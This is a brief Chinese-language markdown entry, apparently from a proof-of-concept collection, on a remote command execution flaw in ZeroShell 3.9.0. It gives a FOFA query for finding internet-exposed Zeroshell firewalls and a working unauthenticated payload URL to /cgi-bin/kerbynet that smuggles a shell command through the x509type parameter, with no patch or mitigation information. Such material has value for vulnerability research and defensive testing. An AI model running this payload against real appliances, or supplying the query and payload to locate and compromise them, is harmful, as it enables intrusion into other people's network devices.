# ZeroShell 3.9.0 远程命令执行漏洞
## 资产收集
fofa：`app="Zeroshell-防火墙"`  
![](./img/login.png)
## POC
`/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Aid%0A%27`  
![](./img/poc.png)